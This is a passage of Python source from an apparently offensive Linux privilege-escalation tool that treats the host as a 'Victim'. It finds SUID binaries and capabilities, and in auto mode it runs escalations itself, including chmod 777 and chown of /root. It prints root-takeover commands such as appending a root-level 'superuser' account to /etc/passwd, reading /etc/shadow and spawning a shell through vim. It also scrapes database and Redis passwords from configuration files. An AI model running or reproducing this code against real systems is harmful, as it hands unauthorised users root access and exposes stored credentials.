    os.system("chmod 777 /root 2>/dev/null")
    auto_chmod_msg(bold, green, blue, warning, endc)
    call(["ls", "-la", "/root"])
    print("\n")

def chown_priv_esc(bold, green, blue, warning, endc):
    os.system("chown -R $(id -un):$(id -gn) /root 2>/dev/null")
    auto_chown_msg(bold, green, blue, warning, endc)
    call(["ls", "-la", "/root"])
    print("\n")

def important_msg0(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Follow the below example and take root's privileges!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)

def cp_priv_esc2(bold, blue, warning, endc):
    important_msg2(bold, blue, warning, endc)
    command = '''
-> LFILE=file_to_write
-> TF=$(mktemp)
-> echo "DATA" > $TF

-> cp $TF $LFILE\n
    '''
    print(command)

def mv_priv_esc2(bold, blue, warning, endc):
    important_msg2(bold, blue, warning, endc)
    command = '''
-> LFILE=file_to_write
-> TF=$(mktemp)
-> echo "DATA" > $TF

-> mv $TF $LFILE\n
    '''
    print(command)

def chown_priv_esc2(bold, blue, warning, endc):
    important_msg2(bold, blue, warning, endc)
    print('-> LFILE=/root\n')
    print('-> chown $(id -un):$(id -gn) $LFILE\n')

def chmod_priv_esc2(bold, blue, warning, endc):
    important_msg2(bold, blue, warning, endc)
    print('-> LFILE=/root\n')
    print('-> chmod 0777 $LFILE\n')

def suid_exp(flag, bold, green, blue, fail, warning, endc):
    flag1 = "false"
    flag2 = "false"
    try:
        command = "find / -perm -4000 2>/dev/null"
        result = os.popen(command).read().strip().split("\n")
        for i in result:
            if i == "":
                continue
            name = i.split("/")[::-1][0]
            if name in defaults:
                if name == "exim4":
                    try:
                        command2 = 'exim4 --version 2>/dev/null'
                        result2 = os.popen(command2).read().strip().split("\n")
                        vers1 = 0.0
                        for y in result2:
                            parts = y.split(" ")
                            if len(parts) >= 3:
                                try:
                                    vers1 = float(parts[2])
                                    break
                                except ValueError:
                                    continue
                        if vers1 >= 4.87 and vers1 <= 4.91:
                            print(bold + green + "\n[!] Found outdated version of exim!\n" + endc)
                            exim_priv_esc(bold, green, blue, fail, warning, endc)
                    except Exception:
                        pass
            if name not in defaults:
                binary_path = i
                print(bold + green + "\n[!] Found intersting suid binary: " + binary_path + endc + "\n")
                print(bold + warning + "[!] Detailed permissions of " + binary_path + ":" + endc + "\n")
                os.system('ls -la ' + binary_path + ' 2>/dev/null')
                print("\n")
                if name in suid_for_read:
                    if name == "ip":
                        ip_msg(bold, blue, warning, endc)
                    important_msg(bold, blue, warning, endc)
                    print(bold + suid_for_read[name] + '\n\n' + endc)
                elif name in suid_manual:
                    important_msg2(bold, blue, warning, endc)
                    print(bold + suid_manual[name] + '\n\n' + endc)
                elif name in suid_manual2:
                    important_msg3(bold, blue, warning, endc)
                    print(bold + suid_manual2[name] + '\n' + endc)
                elif name in suid_download:
                    if name == "curl":
                        curl_priv_esc(bold, blue, warning, endc)
                    elif name == "wget":
                        wget_priv_esc(bold, blue, warning, endc)
                    elif name == "lwp-download":
                        lwp_downlaod_priv_esc(bold, blue, warning, endc)
                elif name == "rake":
                    rake_priv_esc(bold, blue, warning, endc)
                elif name == "x86_64-linux-gnu-readelf":
                    readelf_priv_esc(bold, blue, warning, endc)
                elif name in suid_lim:
                    if name == "nmap":
                        try:
                            command3 = "nmap --version"
                            result3 = os.popen(command3).read().strip().split("\n")
                            vers = 0.0
                            for y in result3:
                                parts = y.split(" ")
                                if len(parts) >= 3:
                                    try:
                                        vers = float(parts[2])
                                        break
                                    except ValueError:
                                        continue
                            if vers > 4:
                                print(bold + fail + "[!] Nmap version doesn't support suid binary privilege escalation mode!\n" + endc)
                                print(bold + blue + "[!] " + name + " version: " + endc + str(vers) + '\n')
                            else:
                                important_msg3(bold, blue, warning, endc)
                                print(bold + suid_lim[name] + '\n' + endc)
                        except Exception:
                            important_msg3(bold, blue, warning, endc)
                            print(bold + suid_lim[name] + '\n' + endc)
                    else:
                        important_msg3(bold, blue, warning, endc)
                        print(bold + suid_lim[name] + '\n' + endc)
                if flag == "auto":
                    if name in suid_exec:
                        print(bold + warning + "[!] Try to do auto Escalation...\n" + endc)
                        root_msg(bold, green, endc)
                        if name == "bash":
                            bash_priv_esc()
                        elif name == "chroot":
                            chroot_priv_esc()
                        elif name == "bsd-csh":
                            csh_priv_esc()
                        elif name == "dash":
                            dash_priv_esc()
                        elif name == "docker":
                            docker_priv_esc()
                        elif name == "env":
                            env_priv_esc()
                        elif name == "expect":
                            expect_priv_esc()
                        elif name == "find":
                            find_priv_esc()
                        elif name == "flock":
                            flock_priv_esc()
                        elif name == "gdb":
                            gdb_priv_esc()
                        elif name == "ionice":
                            ionice_priv_esc()
                        elif name == "ksh2020":
                            ksh_priv_esc()
                        elif name == "ld.so":
                            ld_so_priv_esc()
                        elif name == "logsave":
                            logsave_priv_esc()
                        elif name == "nice":
                            nice_priv_esc()
                        elif name == "node":
                            node_priv_esc()
                        elif name == "nohup":
                            nohup_priv_esc()
                        elif name == "php7.4":
                            php_priv_esc()
                        elif name == "python2.7":
                            python_priv_esc()
                        elif name == "python3.8":
                            python3_priv_esc()
                        elif name == "rlwrap":
                            rlwrap_priv_esc()
                        elif name == "run-parts":
                            run_parts_priv_esc()
                        elif name == "setarch":
                            setarch_priv_esc()
                        elif name == "start-stop-daemon":
                            start_stop_daemon_priv_esc()
                        elif name == "stdbuf":
                            stdbuf_priv_esc()
                        elif name == "strace":
                            strace_priv_esc()
                        elif name == "taskset":
                            taskset_priv_esc()
                        elif name == "time":
                            time_priv_esc()
                        elif name == "timeout":
                            timeout_priv_esc()
                        elif name == "unshare":
                            unshare_priv_esc()
                        elif name == "xargs":
                            xargs_priv_esc()
                        elif name == "zsh":
                            zsh_priv_esc()
                    elif name in suid_mody:
                        config_msg(bold, blue, warning, endc)
                        if name == "cp":
                            flag1 = "true"
                            cp_priv_esc(flag, bold, green, blue, warning, endc)
                        elif name == "mv":
                            flag1 = "true"
                            mv_priv_esc(flag, bold, green, blue, warning, endc)
                    elif name in suid_mody2:
                        if name == "chmod":
                            flag2 = "true"
                            chmod_priv_esc(bold, green, blue, warning, endc)
                        elif name == "chown":
                            flag2 = "true"
                            chown_priv_esc(bold, green, blue, warning, endc)
                elif flag == "manual":
                    if name in suid_manual3:
                        important_msg0(bold, blue, warning, endc)
                        print(bold + suid_manual3[name] + endc + '\n')
                    elif name in suid_mody:
                        if name == "cp":
                            flag, cp_priv_esc2(bold, blue, warning, endc)
                        elif name == "mv":
                            mv_priv_esc2(bold, blue, warning, endc)
                    elif name in suid_mody2:
                        if name == "chown":
                            chown_priv_esc2(bold, blue, warning, endc)
                        elif name == "chmod":
                            chmod_priv_esc2(bold, blue, warning, endc)
    except Exception:
        print(bold + fail + "[!] System Error! Can't search for suid binaries files\n" + endc)
    return flag1, flag2

def controller(filename, flag, bold, blue, green, warning, endc):
    if flag != "manual":
        if filename == '/etc/passwd':
            config_msg(bold, blue, warning, endc)
            cp_priv_esc(flag, bold, green, blue, warning, endc)
    else:
        if filename == '/etc/passwd':
            config_msg2(filename, bold, blue, warning, endc)
            print(bold + '-> echo "superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash" >> /etc/passwd\n\n' + endc)
            other_msg(flag, bold, green, blue, warning, endc)

def checker_general(filename):
    try:
        status = os.stat(filename)
    except (FileNotFoundError, PermissionError, OSError):
        return ("unknown", "unknown", "000", "00", "0")

    uid = status.st_uid
    gid = status.st_gid
    try:
        ownername = pwd.getpwuid(uid)[0]
    except KeyError:
        ownername = str(uid)
    try:
        groupname = grp.getgrgid(gid)[0]
    except KeyError:
        groupname = str(gid)

    octa_status = oct(status.st_mode)[-3:]
    octa_status2 = oct(status.st_mode)[-2:]
    octa_status3 = oct(status.st_mode)[-1:]
    return ownername, groupname, octa_status, octa_status2, octa_status3

def passwd_check(flag, bold, blue, green, warning, endc):
    chamber = "false"
    filename = '/etc/passwd'
    resulter = checker_general(filename)
    if resulter[2] != '644':
        if resulter[4] != '0' and resulter[4] != '1' and resulter[4] != '4' and resulter[4] != '5':
            banner_msg(filename, bold, green, endc)
            controller(filename, flag, bold, blue, green, warning, endc)
            chamber = "true"
    return chamber

def ownership_passwd_check(flag, bold, blue, green, warning, endc, user):
    filename = '/etc/passwd'
    resulter = checker_general(filename)
    if resulter[0] == user:
        if resulter[2] >= '600':
            banner_msg2(filename, bold, green, endc)
            controller(filename, flag, bold, blue, green, warning, endc)
    elif resulter[1] == user:
        if resulter[3] >= '60':
            banner_msg3(filename, bold, green, endc)
            controller(filename, flag, bold, blue, green, warning, endc)

def shadow_check(flag, bold, blue, green, warning, endc, orange):
    chamber2 = "false"
    filename = '/etc/shadow'
    resulter = checker_general(filename)
    if resulter[2] != '640':
        if resulter[4] >= '4':
            banner_msg(filename, bold, green, endc)
            banner_msg4(filename, bold, warning, endc)
            banner_msg7(filename, flag, bold, blue, warning, endc, orange)
            chamber2 = "true"
            if flag == "manual":
                print(bold + '-> cat /etc/shadow\n' + endc)
    return chamber2

def ownership_shadow_check(flag, bold, blue, green, warning, endc, user, orange):
    filename = '/etc/shadow'
    resulter = checker_general(filename)
    if resulter[0] == user:
        if resulter[2] >= '400':
            banner_msg2(filename, bold, green, endc)
            banner_msg4(filename, bold, warning, endc)
            banner_msg7(filename, flag, bold, blue, warning, endc, orange)
            if flag == "manual":
                print(bold + '-> cat /etc/shadow\n' + endc)
    elif resulter[1] == user:
        if resulter[3] >= '40':
            banner_msg2(filename, bold, green, endc)
            banner_msg4(filename, bold, warning, endc)
            banner_msg7(filename, flag, bold, blue, warning, endc, orange)
            if flag == "manual":
                print(bold + '-> cat /etc/shadow\n' + endc)

def root_dir_check(flag, bold, blue, green, warning, endc):
    chamber3 = "false"
    dir_name = '/root'
    resulter = checker_general(dir_name)
    if resulter[2] != '700':
        if resulter[4] == "5" or resulter[4] == "7":
            banner_msg6(dir_name, bold, green, endc)
            banner_msg4(dir_name, bold, warning, endc)
            chamber3 = "true"
            if flag != "manual":
                print(bold + blue + "-> Directory: /root\n" + endc)
                call(['ls', '-la', '/root'])
                print('\n')
    return chamber3

def ownership_root_dir_check(flag, bold, blue, green, warning, endc, user, orange):
    dir_name = "/root"
    resulter = checker_general(dir_name)
    if resulter[0] == user:
        if (resulter[2] >= '500' and resulter[2] < '600') or resulter[2] >= '700':
            banner_msg8(dir_name, bold, green, endc)
            banner_msg4(dir_name, bold, warning, endc)
            if flag != "manual":
                print(bold + blue + "-> Directory: /root\n" + endc)
                call(['ls', '-la', '/root'])
                print('\n')
    elif resulter[1] == user:
        if (resulter[3] >= '50' and resulter[3] < '60') or resulter[3] >= '70':
            banner_msg9(dir_name, bold, green, endc)
            banner_msg4(dir_name, bold, warning, endc)
            if flag != "manual":
                print(bold + blue + "-> Directory: /root\n" + endc)
                call(['ls', '-la', '/root'])
                print('\n')

def apache2_check(filename1, flag, bold, blue, green, warning, endc):
    flagon = "false"
    resulter = checker_general(filename1)
    if resulter[2] != '644':
        if resulter[4] != '0' and resulter[4] != '1' and resulter[4] != '4' and resulter[4] != '5':
            banner_msg(filename1, bold, green, endc)
            flagon = "true"
            if flag == "auto" or flag == "manual":
                banner_msg10(filename1, bold, blue, warning, endc)
                print(bold + '-> https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/\n' + endc)
    return flagon

def ownership_apache2_check(filename1, flag, bold, blue, green, warning, endc, user):
    resulter = checker_general(filename1)
    chester = "false"
    if resulter[0] == user:
        if resulter[2] >= '600':
            banner_msg2(filename1, bold, green, endc)
            chester = "true"
    elif resulter[1] == user:
        if resulter[3] >= '60':
            banner_msg3(filename1, bold, green, endc)
            chester = "true"
    if flag == "auto" or flag == "manual":
        if chester == "true":
            banner_msg10(filename1, bold, blue, warning, endc)
            print(bold + '-> https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/\n' + endc)

def apache2_found(flag, bold, blue, green, warning, endc, user):
    start = "/etc/"
    if not os.path.isdir(start):
        return
    try:
        for dirpath, dirnames, filenames in os.walk(start):
            for filename in filenames:
                if filename == "apache2.conf" or filename == "httpd.conf":
                    filename1 = os.path.join(dirpath, filename)
                    flagon = apache2_check(filename1, flag, bold, blue, green, warning, endc)
                    if flagon != "true":
                        ownership_apache2_check(filename1, flag, bold, blue, green, warning, endc, user)
    except (PermissionError, OSError):
        pass

def redis_check(filename1, flag, bold, blue, green, warning, endc):
    resulter = checker_general(filename1)
    chester2 = "false"
    if resulter[2] != '640':
        if resulter[4] >= '4':
            banner_msg(filename1, bold, green, endc)
            chester2 = "true"
            if flag != "manual":
                read_redis(filename1, bold, warning, endc)
            else:
                banner_msg4(filename1, bold, warning, endc)
    return chester2

def show_redis_creds(filename, redis_array, bold, warning, endc):
    print(bold + warning + "\n[!] Interesting lines of " + filename + ":\n" + endc)
    for i in redis_array:
        print(i)
    print('\n')

def read_redis(filename1, bold, warning, endc):
    try:
        keywords = ['requirepass']
        fopen = open(filename1, mode='r')
        fread = fopen.readlines()
        fopen.close()
        for liner in fread:
            for y in keywords:
                if y in liner:
                    redis_lines.append(liner)
        redis_array = redis_lines
        show_redis_creds(filename1, redis_array, bold, warning, endc)
        redis_array *= 0
    except (FileNotFoundError, PermissionError, OSError):
        pass

def ownership_redis_check(filename1, flag, bold, blue, green, warning, endc, user):
    resulter = checker_general(filename1)
    if resulter[0] == user:
        if resulter[2] >= '400':
            banner_msg2(filename1, bold, green, endc)
            if flag != "manual":
                read_redis(filename1, bold, warning, endc)
            else:
                banner_msg4(filename1, bold, warning, endc)
    elif resulter[1] == user:
        if resulter[3] >= '40':
            banner_msg3(filename1, bold, green, endc)
            if flag != "manual":
                read_redis(filename1, bold, warning, endc)
            else:
                banner_msg4(filename1, bold, warning, endc)

def redis_found(flag, bold, blue, green, warning, endc, user):
    start = "/etc/"
    if not os.path.isdir(start):
        return
    try:
        for dirpath, dirnames, filenames in os.walk(start):
            for filename in filenames:
                if filename == "redis.conf" or filename == "6379.conf":
                    filename1 = os.path.join(dirpath, filename)
                    chester2 = redis_check(filename1, flag, bold, blue, green, warning, endc)
                    if chester2 != "true":
                        ownership_redis_check(filename1, flag, bold, blue, green, warning, endc, user)
    except (PermissionError, OSError):
        pass

def weak_perms(flag, flager, user, bold, blue, green, fail, warning, endc, orange):
    if flager[0] != "true":
        chamber = passwd_check(flag, bold, blue, green, warning, endc)
        if chamber != "true":
            ownership_passwd_check(flag, bold, blue, green, warning, endc, user)
    chamber2 = shadow_check(flag, bold, blue, green, warning, endc, orange)
    if chamber2 != "true":
        ownership_shadow_check(flag, bold, blue, green, warning, endc, user, orange)
    if flager[1] != "true":
        chamber3 = root_dir_check(flag, bold, blue, green, warning, endc)
        if chamber3 != "true":
            ownership_root_dir_check(flag, bold, blue, green, warning, endc, user, orange)
    apache2_found(flag, bold, blue, green, warning, endc, user)
    redis_found(flag, bold, blue, green, warning, endc, user)

def show_db_creds(filename, php_array, bold, green, warning, endc):
    print(bold + warning + "\n[!] Interesting lines of " + filename + ":\n" + endc)
    for i in php_array:
        print(i)
    print('\n')

def read_db_creds(keyword1, keyword2, keyword3, keyword4, filename, bold, green, warning, endc):
    try:
        keyword = [keyword1, keyword2, keyword3, keyword4]
        fopen = open(filename, mode='r')
        fread = fopen.readlines()
        fopen.close()
        for line in fread:
            for x in keyword:
                if x in line:
                    php_files2.append(line)
        php_array = php_files2
        show_db_creds(filename, php_array, bold, green, warning, endc)
        php_array *= 0
    except (FileNotFoundError, PermissionError, OSError):
        pass

def read_php_config(filename, filename1, bold, green, warning, endc):
    if filename == "wp-config.php" or filename == "wp-config-sample.php":
        keyword1 = "DB_NAME"
        keyword2 = "DB_USER"
        keyword3 = "DB_PASSWORD"
        keyword4 = "DB_HOST"
    elif filename == "configuration.php":
        keyword1 = "$host"
        keyword2 = "$user"
        keyword3 = "$password"
        keyword4 = "$db"
    else:
        keyword1 = "database"
        keyword2 = "username"
        keyword3 = "password"
        keyword4 = "host"
    read_db_creds(keyword1, keyword2, keyword3, keyword4, filename1, bold, green, warning, endc)

def php_config(flag, bold, green, warning, fail, endc):
    start = ["/var", "/usr", "/home"]
    for i in start:
        if not os.path.isdir(i):
            continue
        try:
            for dirpath, dirnames, filenames in os.walk(i):
                for filename in filenames:
                    if filename in php_files:
                        filename1 = os.path.join(dirpath, filename)
                        banner_msg5(filename1, bold, green, endc)
                        if flag == "auto":
                            php_perms = checker_general(filename1)
                            if php_perms[4] >= '4':
                                read_php_config(filename, filename1, bold, green, warning, endc)
                            else:
                                print(bold + fail + "[!] Can't read {} \n".format(filename1) + endc)
        except (PermissionError, OSError):
            pass

def rvim_capa():
    command = '''
-> rvim -c ':lua os.execute("reset; exec sh")'
    '''
    print(command + '\n')

def vim_capa():
    command = '''
-> vim -c ':lua os.execute("reset; exec sh")'
    '''
    print(command + '\n')

def capa_exp(bold, blue, green, warning, fail, endc):
    try:
        command = '''
    getcap -r / 2>/dev/null
        '''
        result = os.popen(command).read().strip().split("\n")
        for n in result:
            if n == "":
                continue
            name = n.split("/")[::-1][0]
            name2 = name.split("=")[::1][0]
            name3 = name2.split(" ")[::1][0]
            if name3 not in capa_default:
                print(bold + green + "\n[!] Found interesting capability: " + name3 + endc + '\n')
                print(bold + warning + "Details of " + name3 + ":\n" + endc)
                print(n + "\n\n")
                if name3 in capa_exec:
                    important_msg5(bold, blue, warning, endc)
                    print(bold + capa_exec[name3] + "\n" + endc)
                elif name3 == "rvim":
                    important_msg7(bold, blue, warning, endc)
                    rvim_capa()
                elif name3 == "vim":
                    important_msg7(bold, blue, warning, endc)
                    vim_capa()
    except Exception:
        print(bold + fail + "[!] System Error! Can't search for capabilities" + endc)

def full_write(bold, blue, green, warning, fail, endc):
    try:
        command = 'find / -user root -writable -type f 2>/dev/null| grep -vE "proc|sys"'
        result = os.popen(command).read().strip().split("\n")
        for z in result:
            if z == "":
                continue
            write_array.append(z)
        write2_array = write_array
        if len(write2_array) > 0 and write2_array[0] != "":
            if len(write2_array) == 1:
                print(bold + green + "\n[!] Found World Writable File:\n" + endc)
            else:
                print(bold + green + "\n[!] Found World Writable Files:\n" + endc)
            for g in write2_array:
                print(g)
            print('\n')
        write2_array *= 0
    except Exception:
        print(bold + fail + "[!] System Error! Can't search for world writable files!\n" + endc)

def main():
    print_gradient_banner()
    args = arguments(argv)
    me = User()
    it = Victim()
    if args.color:
        bcolor = Nocolors()
    else:
        bcolor = Bcolors()
    arg_flag = check_4_args(args)
    arg_flag2 = check_4_args2(args, argv)
    if arg_flag == "nothing":
        parser.print_help()
        exit()
    if arg_flag == "banner":
        if args.banner:
            exit()
    if arg_flag == "version":
        if args.version:
            print(bcolor.BOLD + bcolor.OKGREEN + '[+] Current Version: ' + bcolor.ENDC + __version__ + '\n')
            exit()
    if arg_flag == "auto":
        flag = "auto"
    elif arg_flag == "manual":
        flag = "manual"
    dt = test_date()
    print(bcolor.BOLD + bcolor.OKBLUE + '[+] Process started at:\n' + bcolor.ENDC)
    print(dt + '\n\n')
    find_whoami(me.name, me.user, me.group, me.real, me.list, me.home, me.shell, bcolor.BOLD, bcolor.OKBLUE, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
    find_victim(bcolor.BOLD, bcolor.OKBLUE, bcolor.WARNING, bcolor.ENDC, it.host, it.distro, it.kernel, it.pross, it.arch)
    if arg_flag2 == "nothing":
        flager = ['false', 'false']
        if args.suid:
            flager = suid_exp(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.OKBLUE, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC)
        if args.weak:
            weak_perms(flag, flager, me.name, bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC, bcolor.ORANGE)
        if args.php:
            php_config(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
        if args.capa:
            capa_exp(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
        if args.full:
            full_write(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
    elif arg_flag2 == "all":
        flager = suid_exp(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.OKBLUE, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC)
        weak_perms(flag, flager, me.name, bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC, bcolor.ORANGE)
        php_config(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
        capa_exp(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
        full_write(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
    job_finish(flag, bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.ENDC)

if __name__ == "__main__":
    main()
